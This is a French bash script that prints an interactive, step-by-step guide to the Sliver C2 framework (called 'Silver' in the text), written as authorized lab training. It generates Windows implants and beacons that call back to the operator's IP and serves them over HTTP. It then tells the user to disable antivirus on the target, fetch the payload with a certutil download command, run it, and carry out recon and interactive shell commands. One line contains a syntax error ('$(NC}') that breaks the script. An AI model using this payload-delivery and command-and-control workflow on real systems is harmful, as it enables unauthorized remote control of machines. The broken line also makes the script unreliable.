#!/bin/bash

# =============================================================================
# GUIDE INTERACTIF SILVER C2 - ÉTAPE PAR ÉTAPE
# =============================================================================
# Usage: bash guide_interactif.sh
# Ce script vous guide pas à pas dans l'utilisation de Silver C2
# =============================================================================

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Variables globales
STEP=1
TOTAL_STEPS=28
KALI_IP=""
WORK_DIR="$HOME/silver-payloads"

# Fonction d'affichage des étapes
show_step() {
    echo -e "\n${WHITE}========================================${NC}"
    echo -e "${CYAN}ÉTAPE $STEP/$TOTAL_STEPS: $1${NC}"
    echo -e "${WHITE}========================================${NC}"
    ((STEP++))
}

# Fonction de confirmation
wait_continue() {
    echo -e "\n${YELLOW}Appuyez sur ENTRÉE pour continuer...${NC}"
    read
}

# Fonction pour obtenir l'IP
get_kali_ip() {
    echo -e "${BLUE}Détection de votre IP Kali Linux...${NC}"
    KALI_IP=$(ip route get 1.1.1.1 | awk '{print $7}' | head -1)
    if [[ -z "$KALI_IP" ]]; then
        echo -e "${RED}Impossible de détecter l'IP automatiquement${NC}"
        echo -e "${YELLOW}Entrez votre IP Kali manuellement:${NC}"
        read KALI_IP
    fi
    echo -e "${GREEN}IP Kali détectée: $KALI_IP${NC}"
}

# Fonction de vérification
check_command() {
    if command -v "$1" &> /dev/null; then
        echo -e "${GREEN}✅ $1 est installé${NC}"
        return 0
    else
        echo -e "${RED}❌ $1 n'est pas installé${NC}"
        return 1
    fi
}

# Banner
echo -e "${CYAN}"
cat << "EOF"
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║          GUIDE INTERACTIF SILVER C2                   ║
║                                                       ║
║     Guide pas à pas pour Kali Linux                  ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# PHASE 1: PRÉPARATION
echo -e "${WHITE}🔧 PHASE 1: PRÉPARATION DE L'ENVIRONNEMENT${NC}"

show_step "Mise à jour de Kali Linux"
echo -e "${BLUE}Commande à exécuter:${NC}"
echo -e "${YELLOW}sudo apt update && sudo apt upgrade -y${NC}"
echo ""
echo -e "${CYAN}Cette étape met à jour tous les paquets de votre système Kali.${NC}"
echo -e "${CYAN}Cela peut prendre quelques minutes selon votre connexion.${NC}"
wait_continue

show_step "Installation de Silver C2"
echo -e "${BLUE}Commande à exécuter:${NC}"
echo -e "${YELLOW}sudo apt install sliver -y${NC}"
echo ""
echo -e "${CYAN}Installation du framework Silver C2 depuis les dépôts Kali.${NC}"
wait_continue

show_step "Vérification de l'installation"
echo -e "${BLUE}Vérification des composants Silver C2...${NC}"
check_command "sliver-server"
check_command "sliver-client"
echo ""
echo -e "${BLUE}Commandes de test:${NC}"
echo -e "${YELLOW}sliver-server version${NC}"
echo -e "${YELLOW}sliver-client --help${NC}"
wait_continue

# PHASE 2: CONFIGURATION
echo -e "\n${WHITE}🚀 PHASE 2: DÉMARRAGE DE SILVER C2${NC}"

show_step "Détection de votre adresse IP"
get_kali_ip
wait_continue

show_step "Création du répertoire de travail"
mkdir -p "$WORK_DIR"
echo -e "${GREEN}✅ Répertoire créé: $WORK_DIR${NC}"
wait_continue

show_step "Démarrage du serveur Silver C2"
echo -e "${BLUE}Vous devez maintenant ouvrir 2 terminaux:${NC}"
echo ""
echo -e "${YELLOW}TERMINAL 1 (Serveur):${NC}"
echo -e "${WHITE}sudo sliver-server${NC}"
echo ""
echo -e "${YELLOW}TERMINAL 2 (Client):${NC}"
echo -e "${WHITE}sliver-client${NC}"
echo ""
echo -e "${RED}⚠️ IMPORTANT: Gardez ce script ouvert et continuez ici après avoir démarré Silver C2${NC}"
wait_continue

# PHASE 3: LISTENERS
echo -e "\n${WHITE}🎯 PHASE 3: CONFIGURATION DES LISTENERS${NC}"

show_step "Création du listener mTLS"
echo -e "${BLUE}Dans le client Silver C2 (sliver >), tapez:${NC}"
echo -e "${YELLOW}mtls --lport 443${NC}"
echo ""
echo -e "${CYAN}Cela créera un listener mTLS sur le port 443.${NC}"
echo -e "${CYAN}Vous devriez voir: [*] Successfully started job #1${NC}"
wait_continue

show_step "Vérification des listeners"
echo -e "${BLUE}Dans le client Silver C2, tapez:${NC}"
echo -e "${YELLOW}jobs${NC}"
echo ""
echo -e "${CYAN}Vous devriez voir votre listener mTLS actif.${NC}"
wait_continue

# PHASE 4: PAYLOADS
echo -e "\n${WHITE}💾 PHASE 4: GÉNÉRATION DE PAYLOADS${NC}"

show_step "Génération du payload principal"
PAYLOAD_CMD="generate --mtls $KALI_IP:443 --os windows --arch amd64 --format exe --save $WORK_DIR/payload.exe"
echo -e "${BLUE}Dans le client Silver C2, tapez:${NC}"
echo -e "${YELLOW}$PAYLOAD_CMD${NC}"
echo ""
echo -e "${CYAN}Cela va générer un payload Windows 64-bit.${NC}"
echo -e "${CYAN}La génération peut prendre 10-30 secondes.${NC}"
wait_continue

show_step "Génération d'un beacon"
BEACON_CMD="generate beacon --mtls $KALI_IP:443 --os windows --arch amd64 --format exe --jitter 30s --interval 60s --save $WORK_DIR/beacon.exe"
echo -e "${BLUE}Dans le client Silver C2, tapez:${NC}"
echo -e "${YELLOW}$BEACON_CMD${NC}"
echo ""
echo -e "${CYAN}Un beacon est plus furtif car il se connecte périodiquement.${NC}"
wait_continue

show_step "Vérification des payloads générés"
echo -e "${BLUE}Vérification des fichiers créés...${NC}"
if [[ -f "$WORK_DIR/payload.exe" ]]; then
    echo -e "${GREEN}✅ payload.exe trouvé$(NC}"
else
    echo -e "${RED}❌ payload.exe non trouvé - vérifiez la génération${NC}"
fi

if [[ -f "$WORK_DIR/beacon.exe" ]]; then
    echo -e "${GREEN}✅ beacon.exe trouvé${NC}"
else
    echo -e "${RED}❌ beacon.exe non trouvé - vérifiez la génération${NC}"
fi

echo -e "${BLUE}Taille des fichiers:${NC}"
ls -lh "$WORK_DIR"/*.exe 2>/dev/null
wait_continue

# PHASE 5: TRANSFERT
echo -e "\n${WHITE}🌐 PHASE 5: SERVEUR DE TRANSFERT${NC}"

show_step "Démarrage du serveur HTTP"
echo -e "${BLUE}Dans un NOUVEAU terminal, tapez:${NC}"
echo -e "${YELLOW}cd $WORK_DIR${NC}"
echo -e "${YELLOW}python3 -m http.server 8080${NC}"
echo ""
echo -e "${CYAN}Cela permet de télécharger les payloads via HTTP.${NC}"
echo -e "${CYAN}URL d'accès: http://$KALI_IP:8080/${NC}"
wait_continue

# PHASE 6: TEST
echo -e "\n${WHITE}🎯 PHASE 6: TEST AVEC CIBLE${NC}"

show_step "Préparation de la machine cible"
echo -e "${BLUE}Sur votre machine Windows de test:${NC}"
echo ""
echo -e "${CYAN}1. Désactivez l'antivirus (pour les tests uniquement)${NC}"
echo -e "${CYAN}2. Ouvrez une invite de commandes${NC}"
echo -e "${CYAN}3. Assurez-vous que la machine peut accéder à $KALI_IP${NC}"
wait_continue

show_step "Téléchargement du payload sur la cible"
DOWNLOAD_CMD="certutil -urlcache -split -f http://$KALI_IP:8080/payload.exe payload.exe"
echo -e "${BLUE}Sur la machine Windows cible, tapez:${NC}"
echo -e "${YELLOW}$DOWNLOAD_CMD${NC}"
echo ""
echo -e "${CYAN}Cela télécharge le payload sur la machine cible.${NC}"
wait_continue

show_step "Exécution du payload (TEST UNIQUEMENT)"
echo -e "${RED}⚠️ ATTENTION: Uniquement sur une machine de test !${NC}"
echo ""
echo -e "${BLUE}Sur la machine Windows cible:${NC}"
echo -e "${YELLOW}.\\payload.exe${NC}"
echo ""
echo -e "${CYAN}Le payload va se connecter à votre serveur Silver C2.${NC}"
wait_continue

show_step "Vérification de la connexion"
echo -e "${BLUE}Dans le client Silver C2, tapez:${NC}"
echo -e "${YELLOW}sessions${NC}"
echo ""
echo -e "${CYAN}Vous devriez voir votre nouvelle session active !${NC}"
wait_continue

# PHASE 7: POST-EXPLOITATION
echo -e "\n${WHITE}🔥 PHASE 7: POST-EXPLOITATION${NC}"

show_step "Interaction avec la session"
echo -e "${BLUE}Dans Silver C2, pour utiliser une session:${NC}"
echo -e "${YELLOW}use [ID_SESSION]${NC}"
echo ""
echo -e "${CYAN}Remplacez [ID_SESSION] par l'ID de votre session.${NC}"
echo -e "${CYAN}Le prompt changera vers [ID] sliver >${NC}"
wait_continue

show_step "Commandes de reconnaissance"
echo -e "${BLUE}Commandes utiles dans la session:${NC}"
echo -e "${YELLOW}info${NC}     # Informations système"
echo -e "${YELLOW}whoami${NC}   # Utilisateur actuel"
echo -e "${YELLOW}pwd${NC}      # Répertoire courant"
echo -e "${YELLOW}ls${NC}       # Lister fichiers"
echo -e "${YELLOW}ps${NC}       # Processus"
echo -e "${YELLOW}shell${NC}    # Shell interactif"
wait_continue

show_step "Test de commandes système"
echo -e "${BLUE}Dans la session Silver, testez:${NC}"
echo -e "${YELLOW}execute whoami${NC}"
echo -e "${YELLOW}execute systeminfo${NC}"
echo -e "${YELLOW}execute ipconfig /all${NC}"
echo ""
echo -e "${CYAN}Ces commandes vous donnent des informations sur la cible.${NC}"
wait_continue

# PHASE 8: NETTOYAGE
echo -e "\n${WHITE}🧹 PHASE 8: NETTOYAGE${NC}"

show_step "Fermeture de la session"
echo -e "${BLUE}Pour fermer une session Silver:${NC}"
echo -e "${YELLOW}sessions -k [ID_SESSION]${NC}"
echo -e "${CYAN}OU depuis la session:${NC}"
echo -e "${YELLOW}exit${NC}"
wait_continue

show_step "Nettoyage sur la cible"
echo -e "${BLUE}Sur la machine Windows cible, supprimez:${NC}"
echo -e "${YELLOW}del payload.exe${NC}"
echo -e "${YELLOW}del beacon.exe${NC}"
echo ""
echo -e "${RED}⚠️ Important: Nettoyez toujours après les tests${NC}"
wait_continue

show_step "Arrêt de Silver C2"
echo -e "${BLUE}Pour arrêter proprement Silver C2:${NC}"
echo ""
echo -e "${YELLOW}1. Dans le client: exit${NC}"
echo -e "${YELLOW}2. Dans le serveur: Ctrl+C${NC}"
echo -e "${YELLOW}3. Arrêter le serveur HTTP: Ctrl+C${NC}"
wait_continue

# RÉCAPITULATIF FINAL
echo -e "\n${WHITE}🎉 FÉLICITATIONS !${NC}"
echo -e "${GREEN}Vous avez terminé le guide Silver C2 !${NC}"
echo ""
echo -e "${WHITE}📋 RÉCAPITULATIF DES FICHIERS CRÉÉS:${NC}"
echo -e "${CYAN}• Répertoire: $WORK_DIR${NC}"
echo -e "${CYAN}• Payloads: payload.exe, beacon.exe${NC}"
echo ""
echo -e "${WHITE}📚 RESSOURCES DISPONIBLES:${NC}"
echo -e "${CYAN}• Etapes_Detaillees_Silver_C2.md - Ce guide détaillé${NC}"
echo -e "${CYAN}• Guide_Silver_C2_Kali_Linux.md - Guide complet${NC}"
echo -e "${CYAN}• Guide_Payloads_Silver_C2.md - Guide des payloads${NC}"
echo -e "${CYAN}• commandes_sliver_reference.sh - Référence rapide${NC}"
echo ""
echo -e "${WHITE}🔧 COMMANDES ESSENTIELLES À RETENIR:${NC}"
cat << EOF

# Démarrage
sudo sliver-server          # Terminal 1
sliver-client              # Terminal 2

# Listener
mtls --lport 443

# Payload
generate --mtls IP:443 --os windows --format exe --save payload.exe

# Sessions  
sessions                   # Lister
use [ID]                  # Utiliser
info                      # Infos système
shell                     # Shell interactif

EOF

echo -e "${RED}⚠️ RAPPEL SÉCURITÉ:${NC}"
echo -e "${YELLOW}Utilisez uniquement dans un environnement de test autorisé !${NC}"
echo ""
echo -e "${GREEN}Bon apprentissage avec Silver C2 ! 🚀${NC}"